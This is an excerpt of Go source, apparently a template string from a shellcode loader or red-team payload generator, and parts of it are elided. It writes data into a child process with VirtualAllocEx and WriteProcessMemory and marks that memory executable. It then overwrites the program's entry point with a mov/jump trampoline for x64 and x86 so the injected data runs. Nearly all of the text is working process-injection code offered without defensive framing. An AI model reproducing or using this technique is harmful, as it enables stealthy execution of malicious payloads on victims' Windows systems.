...
const CreateProcessDlls = `// Load DLLs and Procedures
...
addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(data)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
...
// Write data into child process memory

_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))

if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
	log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
}

// Change memory permissions to RX in child process where data was written

oldProtect := windows.PAGE_READWRITE
_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(data)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
...
// Overwrite the value at AddressofEntryPoint field with trampoline to load the data address in RAX/EAX and jump to it
var ep uintptr
...
var epBuffer []byte
var dataAddressBuffer []byte
// x86 - 0xb8 = mov eax
// x64 - 0x48 = rex (declare 64bit); 0xb8 = mov eax
if peHeader.Machine == 34404 { // 0x8664 x64
	epBuffer = append(epBuffer, byte(0x48))
	epBuffer = append(epBuffer, byte(0xb8))
	dataAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
	binary.LittleEndian.PutUint64(dataAddressBuffer, uint64(addr))
	epBuffer = append(epBuffer, dataAddressBuffer...)
} else if peHeader.Machine == 332 { // 0x14c x86
	epBuffer = append(epBuffer, byte(0xb8))
	dataAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
	binary.LittleEndian.PutUint32(dataAddressBuffer, uint32(addr))
	epBuffer = append(epBuffer, dataAddressBuffer...)
} else {
	log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
}
